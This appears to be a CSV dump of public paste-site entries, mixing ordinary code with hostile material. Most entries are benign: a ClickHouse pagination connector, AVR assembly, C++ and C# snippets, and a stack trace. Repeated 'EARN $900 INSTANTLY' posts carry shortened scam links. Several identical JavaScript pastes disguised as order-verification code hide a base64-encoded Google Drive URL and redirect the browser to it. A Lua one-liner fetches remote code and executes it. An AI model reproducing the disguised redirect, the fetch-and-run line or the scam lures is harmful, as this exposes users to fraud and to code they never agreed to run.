id,title,username,language,date,content
KcWQKeyK,EARN $900 INSTANTLY 2025⭐ 1R,william248383r34,JavaScript,Monday 21st of April 2025 07:05:29 AM CDT," 
Pdf https://tinyurl.com/privguidee


jbnGxmnX4p
"
6sn8QqBY,Products.js,kammex,JavaScript,Monday 21st of April 2025 06:58:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72087/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nvjgBBjp,CapybaraScript,Phatpogi,Lua,Monday 21st of April 2025 06:54:13 AM CDT,"loadstring(game:HttpGet(""http://vpaste.net/UijxY""))()"
euaAJ5ug,Make $1000 15-MINUTES  (BEGINNER) SW,william248383r34,JavaScript,Monday 21st of April 2025 06:52:00 AM CDT," 
Pdf https://tinyurl.com/privguidee


Rfihz0p1Cz
"
m6RUiE6L,Order.js,kammex,JavaScript,Monday 21st of April 2025 06:42:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/86930/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BV7KyJM5,EARN $900 INSTANTLY 2025 JQ,william248383r34,JavaScript,Monday 21st of April 2025 06:38:29 AM CDT," 
Pdf https://tinyurl.com/privguidee


E4k2DNh7se
"
cy22QZ9B,Untitled,sombruxo,ASM (NASM),Monday 21st of April 2025 06:32:24 AM CDT,"	ldi r18, (2<<COM0A0) | (1<<WGM01)| (1<<WGM00)
	out TCCR0A, r18
	ldi r18, (0<<WGM02)|(5<<CS00)
	out TCCR0B, r18"
gpHfmcR8,Untitled,gubichas,Python,Monday 21st of April 2025 06:27:43 AM CDT,"# clickhouse_connector.py

""""""
Модуль для подключения и извлечения данных из ClickHouse
с использованием sqldbclient.
""""""

import logging
from urllib.parse import quote_plus
import pandas as pd  # sqldbclient часто возвращает DataFrame

# ... (импорты и настройка логгера без изменений) ...

try:
    from sqldbclient import SqlExecutor, SqlExecutorConf
except ImportError:
    # ... (обработка ImportError без изменений) ...
    pass # Добавил pass для синтаксиса

class ClickHouseConnector:
    """"""
    Класс для управления подключением к ClickHouse
    с использованием sqldbclient.
    """"""

    def __init__(self, config):
        # ... (метод __init__ без изменений) ...
        self.config = config
        self.executor = None
        self._initialize_executor()

    def _initialize_executor(self):
        # ... (метод _initialize_executor без изменений) ...
        try:
            host = self.config['host']
            port = self.config.get('port', 8123)  # Порт по умолчанию для HTTP
            username = self.config['username']
            password = self.config['password']

            # Экранируем пароль для URL
            quoted_password = quote_plus(password)

            # Формируем URL для SQLAlchemy-совместимого драйвера ClickHouse
            # Используем clickhouse+http, как в примере
            engine_url = f'clickhouse+http://{username}:{quoted_password}@{host}:{port}'

            logger.info(f""Инициализация SqlExecutor для ClickHouse: clickhouse+http://{username}:***@{host}:{port}"")

            # Создаем конфигурацию для SqlExecutor
            # history_db_name можно сделать настраиваемым или убрать, если не требуется
            conf = SqlExecutorConf() \
                .set('engine_options', engine_url) \
                .set('history_db_name', 'ch_executor_history.db')
                # ### ИЗМЕНЕНИЕ НАЧАЛО ###
                # Убираем .set('max_rows_read', 10002), так как мы явно управляем LIMIT в пагинации
                # и эта настройка только мешает и создает лишние warning'и в логах.
                # .set('max_rows_read', 10002)
                # ### ИЗМЕНЕНИЕ КОНЕЦ ###

            # Создаем экземпляр SqlExecutor
            self.executor = SqlExecutor.builder.config(conf).get_or_create()
            logger.info(""SqlExecutor для ClickHouse успешно инициализирован."")

        except KeyError as e:
            logger.error(f""Ошибка конфигурации ClickHouse: отсутствует обязательный ключ {e}"")
            self.executor = None
        except Exception as e:
            logger.error(f""Ошибка при инициализации SqlExecutor для ClickHouse: {e}"")
            self.executor = None

    def connect(self):
        # ... (метод connect без изменений) ...
        if self.executor is None:
            logger.error(""SqlExecutor не был инициализирован из-за ошибки конфигурации."")
            return False
        try:
            # Выполняем простой запрос для проверки соединения
            result_df = self.executor.execute('SELECT 1')
            # Проверяем, что результат не пустой и содержит ожидаемое значение
            if not result_df.empty and result_df.iloc[0, 0] == 1:
                logger.info(""Успешное подключение к ClickHouse (проверено через SqlExecutor)!"")
                return True
            else:
                logger.error(f""Проверка подключения к ClickHouse не удалась. Результат: {result_df}"")
                return False
        except Exception as e:
            logger.error(f""Ошибка при проверке подключения к ClickHouse через SqlExecutor: {e}"")
            return False

    def extract_data(self, table_name, execution_date, query=None):
        # ... (метод extract_data без изменений) ...
        # (Примечание: этот метод не используется в ошибочном сценарии, но оставляем его как есть)
        if self.executor is None:
            logger.error(""Соединение с ClickHouse (SqlExecutor) не установлено."")
            raise Exception(""Соединение с ClickHouse (SqlExecutor) не установлено."")

        try:
            if query is None:
                query = f""SELECT * FROM {table_name}""
                # query = f""SELECT * FROM {table_name} where date = '{execution_date}'"" # Пример использования execution_date
                logger.info(f'Используется стандартный запрос: {query}')

            logger.info(
                f""Выполнение запроса к ClickHouse: {query[:200]}{'...' if len(query) > 200 else ''}"")  # Логгируем начало запроса
            data_df = self.executor.execute(query)  # SqlExecutor возвращает DataFrame
            logger.info(f""Извлечено {len(data_df)} строк из ClickHouse."")

            if not isinstance(data_df, pd.DataFrame):
                logger.warning(f""SqlExecutor вернул не DataFrame, а {type(data_df)}. Преобразование..."")
                try:
                    data_df = pd.DataFrame(data_df)
                except Exception:
                    logger.error(""Не удалось преобразовать результат в DataFrame."")
                    return pd.DataFrame()

            return data_df
        except Exception as e:
            logger.error(f""Ошибка при извлечении данных из ClickHouse: {e}"")
            return pd.DataFrame()

    def get_table_schema(self, table_name):
        # ... (метод get_table_schema без изменений) ...
        if self.executor is None:
            logger.error(""Соединение с ClickHouse (SqlExecutor) не установлено."")
            raise Exception(""Соединение с ClickHouse (SqlExecutor) не установлено."")

        try:
            query = f""DESCRIBE TABLE {table_name}""
            logger.info(f""Получение схемы таблицы: {query}"")
            schema_df = self.executor.execute(query)

            if not isinstance(schema_df, pd.DataFrame):
                logger.warning(f""SqlExecutor вернул не DataFrame для схемы, а {type(schema_df)}. Преобразование..."")
                try:
                    schema_df = pd.DataFrame(schema_df)
                except Exception:
                    logger.error(""Не удалось преобразовать схему в DataFrame."")
                    return pd.DataFrame()

            logger.info(f""Схема для таблицы {table_name} получена."")
            return schema_df
        except Exception as e:
            logger.error(f""Ошибка при получении схемы таблицы из ClickHouse: {e}"")
            return pd.DataFrame()

    def extract_all_data_using_pagination(self, base_query, order_by_column, chunk_size=10000, settings=None):
        """"""
        Извлекает ВСЕ данные из ClickHouse, используя пагинацию ВНУТРИ,
        и возвращает ОДИН большой DataFrame с КОРРЕКТНЫМИ заголовками.
        (Остальная документация без изменений)
        """"""
        logger.info(f""Начало извлечения ВСЕХ данных с внутренней пагинацией (chunk_size={chunk_size})."")
        logger.warning(""ПРЕДУПРЕЖДЕНИЕ: Все результаты будут загружены в память!"")

        all_chunks = []
        total_rows = 0

        try:
            # Вызываем наш же генератор пагинации, который теперь возвращает чанки с правильными заголовками
            paginator = self.extract_data_paginated(
                base_query=base_query,
                order_by_column=order_by_column,
                chunk_size=chunk_size,
                settings=settings
            )

            # Собираем все чанки из генератора в список
            for i, chunk_df in enumerate(paginator):
                chunk_num = i + 1
                logger.info(f""Сборка: получен чанк #{chunk_num} размером {len(chunk_df)} строк с корректными заголовками."")

                # ### ИЗМЕНЕНИЕ НАЧАЛО ###
                # Убираем проверку и исправление дублирующихся КОЛОНОК,
                # так как `extract_data_paginated` теперь сам заботится о правильных заголовках.
                # if not chunk_df.columns.is_unique:
                #    duplicate_cols = list(chunk_df.columns[chunk_df.columns.duplicated()])
                #    logger.warning(f""Чанк #{chunk_num} содержит дублирующиеся имена колонок: {duplicate_cols}. ""
                #                   f""Удаление дубликатов (оставляем первое вхождение)..."")
                #    chunk_df = chunk_df.loc[:, ~chunk_df.columns.duplicated()]
                #    logger.info(f""Колонки чанка #{chunk_num} после дедупликации: {list(chunk_df.columns)}"")
                # ### ИЗМЕНЕНИЕ КОНЕЦ ###

                if not chunk_df.empty:
                    all_chunks.append(chunk_df)
                    total_rows += len(chunk_df)

            if all_chunks:
                # logger.info(f'all_chunks={all_chunks}') # Этот лог может быть ОЧЕНЬ большим, лучше закомментировать или убрать
                logger.info(f""Объединение {len(all_chunks)} чанков (собрано {total_rows} строк до concat)..."")
                try:
                    # pd.concat теперь должен работать корректно, так как все чанки имеют одинаковые и правильные колонки.
                    final_df = pd.concat(all_chunks, ignore_index=True)
                    logger.info(f""Итоговый DataFrame содержит {len(final_df)} строк."")
                    logger.info(f""Колонки итогового DataFrame: {list(final_df.columns)}"") # Добавим лог для проверки

                    # Проверка на дубликаты СТРОК (остается актуальной, если ORDER BY не уникален)
                    if final_df.duplicated().any():
                        num_duplicates = final_df.duplicated().sum()
                        logger.warning(f""В итоговом DataFrame обнаружено {num_duplicates} дублирующихся СТРОК! ""
                                       f""Это обычно вызвано нестабильной сортировкой ('{order_by_column}'). ""
                                       f""Рассмотрите возможность добавления уникального ключа в ORDER BY."")
                        # Опциональное удаление дубликатов строк
                        # final_df = final_df.drop_duplicates(ignore_index=True)

                    return final_df
                except Exception as concat_err:
                    logger.error(f""Неожиданная ошибка при выполнении pd.concat: {concat_err}"", exc_info=True)
                    raise concat_err
            else:
                logger.info(""Не было получено данных из ClickHouse."")
                return pd.DataFrame()

        except Exception as e:
            logger.error(f""Ошибка во время сбора данных с внутренней пагинацией: {e}"", exc_info=True)
            raise e

    def extract_data_paginated(self, base_query, order_by_column, chunk_size=10000, settings=None):
        """"""
        Извлекает данные из ClickHouse частями (пагинация) с использованием генератора,
        ГАРАНТИРУЯ КОРРЕКТНЫЕ ЗАГОЛОВКИ для каждого чанка.
        (Остальная документация без изменений)
        """"""
        if self.executor is None:
            logger.error(""Соединение с ClickHouse (SqlExecutor) не установлено."")
            raise Exception(""Соединение с ClickHouse (SqlExecutor) не установлено."")
        # ... (проверки аргументов base_query, order_by_column, chunk_size без изменений) ...
        if not base_query:
             raise ValueError(""Необходимо указать базовый SQL-запрос ('base_query')."")
        if not order_by_column:
             logger.warning(""УКАЗАНА КОЛОНКА(И) ДЛЯ СОРТИРОВКИ ('order_by_column'), НО ДЛЯ НАДЕЖНОЙ ПАГИНАЦИИ ""
                            ""ОНА ДОЛЖНА БЫТЬ УНИКАЛЬНОЙ ИЛИ ВКЛЮЧАТЬ ВСЕ КОЛОНКИ!"")
             raise ValueError(""Необходимо указать колонку(и) для сортировки ('order_by_column') для пагинации."")
        if chunk_size <= 0:
             raise ValueError(""'chunk_size' должен быть положительным числом."")

        # ### ИЗМЕНЕНИЕ НАЧАЛО ###
        # Убираем предупреждение и изменение chunk_size из-за max_rows_read, так как мы его убрали.
        # effective_chunk_size = min(chunk_size, 10000)
        # if chunk_size > 10000:
        #     logger.warning(f""Запрошенный chunk_size={chunk_size} превышает стандартный лимит sqldbclient (10000). ""
        #                    f""Будет использоваться эффективный лимит {effective_chunk_size}."")
        # else:
        #     logger.info(f""Начало пагинации: chunk_size={chunk_size}, сортировка по '{order_by_column}'."")
        effective_chunk_size = chunk_size # Используем заданный chunk_size напрямую
        logger.info(f""Начало пагинации: chunk_size={effective_chunk_size}, сортировка по '{order_by_column}'."")
        # ### ИЗМЕНЕНИЕ КОНЕЦ ###

        offset = 0
        total_fetched = 0
        settings_str = """" # Не изменяем логику settings
        # ... (код для settings_str остается прежним) ...

        logger.debug(f""Базовый запрос: {base_query}"")

        # ### ИЗМЕНЕНИЕ НАЧАЛО ###
        # Получаем корректные заголовки ОДИН РАЗ перед циклом
        correct_headers = None
        try:
            # Используем LIMIT 1 (или LIMIT 0, если драйвер точно вернет заголовки)
            header_query = f""{base_query} LIMIT 1""
            logger.info(f""Получение заголовков запросом: {header_query[:200]}{'...' if len(header_query) > 200 else ''}"")
            header_df = self.executor.execute(header_query)

            if isinstance(header_df, pd.DataFrame):
                 correct_headers = header_df.columns
                 logger.info(f""Корректные заголовки получены: {list(correct_headers)}"")
            else:
                 logger.error(f""Не удалось получить заголовки: execute вернул тип {type(header_df)}"")
                 # Можно либо выбросить ошибку, либо попробовать продолжить, рискуя получить ту же проблему
                 raise Exception(""Не удалось получить корректные заголовки столбцов из ClickHouse."")

        except Exception as e:
            logger.error(f""Ошибка при получении заголовков из ClickHouse: {e}"", exc_info=True)
            raise e # Перевыбрасываем ошибку, без заголовков продолжать бессмысленно

        # Если correct_headers не None, продолжаем с пагинацией
        # ### ИЗМЕНЕНИЕ КОНЕЦ ###

        i = 0
        while True:
            logger.info(f""Итерация пагинации #{i + 1}, offset={offset}"")

            # Формируем запрос с LIMIT и OFFSET
            paginated_query = f""""""{base_query}
                                ORDER BY {order_by_column}
                                LIMIT {effective_chunk_size}
                                OFFSET {offset}
                                {settings_str}"""""" # Убрал лишние --ff комментарии

            logger.debug(
                f""Запрос чанка (offset={offset}): {paginated_query[:500]}{'...' if len(paginated_query) > 500 else ''}"")

            try:
                # Выполняем запрос
                chunk_df = self.executor.execute(paginated_query)

                # Проверка типа (на всякий случай)
                if not isinstance(chunk_df, pd.DataFrame):
                     logger.warning(f""SqlExecutor вернул не DataFrame для чанка #{i+1}, а {type(chunk_df)}. Попытка преобразования..."")
                     try:
                         chunk_df = pd.DataFrame(chunk_df)
                         logger.info(""Преобразование в DataFrame успешно."")
                     except Exception as convert_err:
                         logger.error(f""Не удалось преобразовать чанк #{i+1} в DataFrame: {convert_err}"")
                         # Решаем, что делать: пропустить чанк или остановить ETL
                         raise Exception(f""Не удалось преобразовать чанк #{i+1} в DataFrame."") from convert_err

                num_fetched_in_chunk = len(chunk_df)
                logger.debug(f""Получено строк в чанке: {num_fetched_in_chunk}."")

                if num_fetched_in_chunk == 0:
                    if i == 0:
                        logger.info(""Получен пустой результат на первой итерации (0 строк). В источнике нет данных по запросу."")
                    else:
                        logger.info(f""Получен пустой чанк (0 строк) для offset={offset}. Завершение пагинации."")
                    break # Выход из цикла пагинации

                # ### ИЗМЕНЕНИЕ НАЧАЛО ###
                # Применяем КОРРЕКТНЫЕ заголовки к полученному чанку
                if correct_headers is not None:
                    if len(chunk_df.columns) == len(correct_headers):
                        logger.debug(f""Применение корректных заголовков к чанку #{i+1}"")
                        chunk_df.columns = correct_headers
                    else:
                        logger.error(f""Ошибка! Количество столбцов в чанке #{i+1} ({len(chunk_df.columns)}) не совпадает""
                                     f"" с количеством в заголовке ({len(correct_headers)})!"")
                        logger.error(f""Столбцы чанка: {list(chunk_df.columns)}"")
                        logger.error(f""Ожидаемые столбцы: {list(correct_headers)}"")
                        # Это неожиданная ситуация, лучше остановить процесс
                        raise ValueError(f""Несоответствие количества столбцов в чанке #{i+1} и заголовке."")
                else:
                    # Эта ветка не должна выполняться, если получение заголовков было успешным
                    logger.error(""Критическая ошибка: отсутствуют корректные заголовки для применения."")
                    raise Exception(""Критическая ошибка: отсутствуют корректные заголовки."")
                # ### ИЗМЕНЕНИЕ КОНЕЦ ###

                total_fetched += num_fetched_in_chunk
                yield chunk_df # Возвращаем чанк с правильными заголовками
                offset += num_fetched_in_chunk

            except Exception as e:
                logger.error(f""Ошибка при извлечении чанка данных (offset={offset}): {e}"", exc_info=True)
                raise e

            i += 1

        logger.info(f""Пагинация завершена. Всего извлечено строк через генератор: {total_fetched}."")"
FQQiFLni,Market.js,kammex,JavaScript,Monday 21st of April 2025 06:26:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46532/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WFYe02MX,Make $1000 15-MINUTES (BEGINNER) 7J,william248383r34,JavaScript,Monday 21st of April 2025 06:25:02 AM CDT," 
Pdf https://tinyurl.com/privguidee


b8qNKgGtmf
"
mzQbg52F,Untitled,dllbridge,C,Monday 21st of April 2025 06:24:21 AM CDT,"

#include  <iostream>
#include     <queue>

using namespace std;




/////////////////////////////////////////////////////
int main() 
{
    
    queue<string> q_s; 
    
    
    q_s.push(    ""SONY"");
    q_s.push(""Pictures"");    
    
    cout << ""q_s.size() = "" << q_s.size() << endl;
    
}




////////////////////////////////////////////////////////
void monitor(queue<string> &r)
{
     
     int n = r.size();
     
     queue<string>::iterator it;
     
    // it = r.begin();
     
     for(int i = 0; i < n; i++)
     {
        // cout << *it << endl;
         
       //  it++;    
     }
     
}























/*
#include  <iostream>
#include    <string>
#include    <vector>
using namespace std;


void monitor(vector<float> &r);

/////////////////////////////////////////////////////
int main() 
{
    
   vector<float> v_f (9, 2);  
   
   vector<float>::iterator it = ;    
    	
   cout << "" v_f.size() = "" << v_f.size() << endl; 
   
   v_f.insert(v_f.begin(), 7.54);
   
   it = &(v_f[4]);
   
   v_f.push_back ( 4.3);	

   monitor(v_f);
   
}


////////////////////////////////////////////////////////
void monitor(vector<float> &r)
{
     
     for(int i = 0; i < r.size(); i++)
     {
             
         cout << ""v_f[] = ""<< r[i] << endl;             
     }
}



*/


















/*

#include  <iostream>
#include    <string>
#include    <vector>
using namespace std;
/////////////////////////////////////////////////////
int main() 
{
    
    
    string s1 = ""SONY"";

   	
    
    cout << "" s1.size()   = "" << s1.size  () << endl; 
    cout << "" s1.length() = "" << s1.length() << endl; 	
	
return 0;
}
*/

"
0QnvgYmm,EARN $900 INSTANTLY 2025⭐ 1R,william248383r34,JavaScript,Monday 21st of April 2025 06:11:38 AM CDT," 
Pdf https://tinyurl.com/privguidee


SnvRvXy7aJ
"
y645ctFW,Untitled,kammex,JavaScript,Monday 21st of April 2025 06:11:37 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/75621/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vvgrx4ri,dataNone,TestGuy1,JSON,Monday 21st of April 2025 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '8cdc1e826fc149ed7d41dbdbec677b9d6121e3bc7e791bf4d9bb64b720ce3ae02f57828f0b24cae5f993bf11e4932e93814cf023001b0f37af757402d8cf70a470b1b7de14629890d0653ecf352a8229284cada15f8bb05e3125beef8f4deb78460e01893d579191b8611391ed69267c2f53531bbcdb7a1a95d11deb1c54b856',
  otherdata: [
    '56c8f580e10bf5202d300200b43c8202',
    '0788d9c4391334b0aa68880fa432d5c2',
    'cf9ef1d59c7002cdbcdf0db3b8d6dd30',
    '6588a46dad2e13e6c64522fd3695ae12',
    'e173fb1be6813374a38e1deece873801',
    'b013e1551537684d1cf5222e77ad0043',
    '19b86ffe4d3d74d863312f7f43322b0d',
    '4820537582e958a22512f87d06721d83'
  ]
}"
9mkX7gbS,Products.js,kammex,JavaScript,Monday 21st of April 2025 05:56:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18131/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bUuG9k49,邀您一起看：添加项目,xiaomianao666,JavaScript,Monday 21st of April 2025 05:53:50 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥添加项目@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5oiR55qE5Li76aG1XCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eVwiLFwiY29sX3R5cGVcIjpcIng1X3dlYnZpZXdfc2luZ2xlXCIsXCJmaW5kX3J1bGVcIjpcImpzOnNldFJlc3VsdChbe1xcbiAgICB1cmw6XFxcImZpbGU6Ly8vc3RvcmFnZS9lbXVsYXRlZC8wL0FuZHJvaWQvZGF0YS9ya3YueGZodHFwdS56b3B6YWpyeGkvZmlsZXMvRG9jdW1lbnRzL25ld1BsYW5Ib21lLmh0bWwjbm9SZWNvcmRIaXN0b3J5I1xcXCIsXFxuZGVzYzpcXFwiMTAwJSYmZmxvYXRcXFwiLFxcbmV4dHJhOntjYW5CYWNrOiB0cnVlfVxcbn1dKTtcIixcImdyb3VwXCI6XCLop4LlvbFcIixcInBhZ2VzXCI6XCJbXVwifSIsInRpdGxlIjoi5re75Yqg6aG555uuIn0=
2479dxbn,DPt Slot RNG,namofure,C#,Monday 21st of April 2025 05:48:53 AM CDT,"using System;
using System.IO;
using System.Linq;

namespace DPt_Slot_RNG_Tool
{
    internal class Program
    {
        static void Main(string[] args)
        {
            do
            {
                Console.WriteLine("""");
                Console.WriteLine(""======================================"");
                Console.Write(""DPt Slot RNG Tool\n"");
                Console.Write(""Enter Daily SEED : 0x"");   // 日替わりSEED入力

                if (uint.TryParse(Console.ReadLine(), System.Globalization.NumberStyles.HexNumber, null, out uint Seed))
                {
                    byte[] data = { 0x00, 0x05, 0x01, 0x01, 0x04, 0x04, 0x02, 0x02, 0x02, 0x03, 0x03, 0x03 };
                    int iCount = 11;
                    int D = 0;

                    using (StreamWriter writer = new StreamWriter(""test.txt""))
                    {
                        for (int n = 0; n < 12; n++)
                        {
                            for (int i = 0; i < iCount; i++)
                            {
                                Seed = NextSeed(Seed);
                                uint Swap = (Seed >> 16) % 0xC;

                                byte temp = data[D];
                                data[D] = data[Swap];
                                data[Swap] = temp;

                                //writer.WriteLine($""[SEED = 0x{Seed:X8}, Swap = {Swap}, D = {D}] "" +
                                                 //string.Join("" "", data.Select(b => b.ToString(""X2""))));
                            }
                            D++;
                            iCount--;
                        }
                    }

                    Console.WriteLine(""\nSlot Table:"");
                    Console.WriteLine(string.Join("" "", data.Select(b => b.ToString(""X2""))));

                    Console.WriteLine(""\nSlot Layout:"");
                    DisplayGrid(data);
                    Console.WriteLine(""======================================"");

                    Console.WriteLine(""\nPress 'R' to run again or any other key to exit.\n"");
                }
            }
            while (Console.ReadKey().Key == ConsoleKey.R);  // 'R'キーで再実行
        }

        static uint NextSeed(uint Seed)
        {
            ulong a = 1103515245;
            ulong b = 24691;
            ulong result = (a * Seed + b) & 0xFFFFFFFF;
            return (uint)result;
        }

        static void DisplayGrid(byte[] data)
        {
            string[,] grid = new string[4, 4];

            grid[0, 0] = ""N"";
            grid[1, 2] = ""N"";
            grid[2, 3] = ""N"";
            grid[3, 0] = ""N"";

            int[,] positions = new int[,]
            {
                {0, 2}, {1, 3}, {1, 0},
                {2, 0}, {3, 3}, {0, 1},
                {1, 1}, {2, 1}, {3, 1},
                {0, 3}, {2, 2}, {3, 2},
            };

            for (int i = 0; i < 12; i++)
            {
                int row = positions[i, 0];
                int col = positions[i, 1];
                grid[row, col] = data[i].ToString(""X"");
            }

            for (int i = 0; i < 4; i++)
            {
                for (int j = 0; j < 4; j++)
                {
                    Console.Write((grid[i, j] ?? "" "").PadLeft(2) + "" "");
                }
                Console.WriteLine();
            }
        }
    }
}"
71uCYF5n,Order.js,kammex,JavaScript,Monday 21st of April 2025 05:40:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83490/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vnYNRREa,2025-04-21T16:05:26.167400,powerampache,PHP,Monday 21st of April 2025 05:35:27 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
